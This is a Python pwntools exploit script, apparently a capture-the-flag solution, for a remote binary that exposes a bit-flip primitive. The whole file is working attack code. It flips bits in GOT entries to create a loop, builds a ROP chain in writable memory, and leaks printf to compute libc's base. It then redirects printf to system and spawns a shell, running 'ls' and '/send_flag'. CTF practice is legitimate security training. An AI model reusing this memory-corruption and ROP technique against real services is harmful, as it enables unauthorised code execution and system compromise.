# coding: utf-8
from __future__ import print_function, division
from pwn import *
import random

#t socat TCP-L:3001,reuseaddr,fork EXEC:./execfile



is_gaibu = True
host = "problem"
port = 12345
rce = 0x4526a
libc_offset = 0x20740 +  240


r = remote(host, port)

raw_input('')

def flip(addr, bit):
    r.recvuntil('flip: ')
    r.sendline(hex(addr))
    r.recvuntil('flip?')
    r.sendline(str(bit))

exit_got = 0x601031
dl_got = 0x601010
print("make loop")
flip(exit_got, 0)

bits = 0b100111110111101
cnt = 0
bit = 0

while bits > 0:
    addr = dl_got + cnt
    print(hex(addr), bit)
    if bits & 1 == 1:
        flip(addr, bit)
    bits >>= 1
    bit += 1
    if bit == 8:
        bit = 0
        cnt += 1

poprdi_ret = 0x00400733
poprsihoge_ret = 0x00400731
plt_puts = 0x4004c0
plt_scanf = 0x4004e0
got_printf = 0x601020
rel_printf = 0x055800
rel_system = 0x045390
plt_printf = 0x4004d0
llu = 0x400869

buf = 0x00601800

data = [
    (buf + 0x8* 2, 0x213b68733b),

    (buf + 0x8* 3, poprdi_ret),
    (buf + 0x8* 4, buf + 0x8 *2),
    (buf + 0x8* 5, plt_printf),

    (buf + 0x8* 6, poprdi_ret),
    (buf + 0x8* 7, got_printf),
    (buf + 0x8* 8, plt_printf),

    (buf + 0x8* 9, poprdi_ret),
    (buf + 0x8*10, llu),
    (buf + 0x8*11, poprsihoge_ret),
    (buf + 0x8*12, got_printf),
    (buf + 0x8*13, 0x1234),
    (buf + 0x8*14, plt_scanf),

    (buf + 0x8*15, poprdi_ret),
    (buf + 0x8*16, buf + 0x8*2),
    (buf + 0x8*17, plt_printf),
]

for (x, y) in data:
    bits = y
    cnt = 0
    bit = 0
    while bits > 0:
        addr = x + cnt
        print(hex(addr), bit)
        if bits & 1 == 1:
            flip(addr, bit)
        bits >>= 1
        bit += 1
        if bit == 8:
            bit = 0
            cnt += 1

flip(0, 8)
flip(0, 8)
flip(0, 8)
flip(0x0040072d, buf)
flip(0, 0x0040072c)

print("revert exit")
flip(exit_got, 0)

r.recvuntil(";sh;!")
p = r.recvuntil("\n")[:-1]
a_printf = u64(p)
libc_base = a_printf - rel_printf
a_system = libc_base + rel_system
d = a_system

r.sendline(str(d))

r.sendline('ls')
print(r.recv())
r.sendline('/send_flag')
r.interactive()

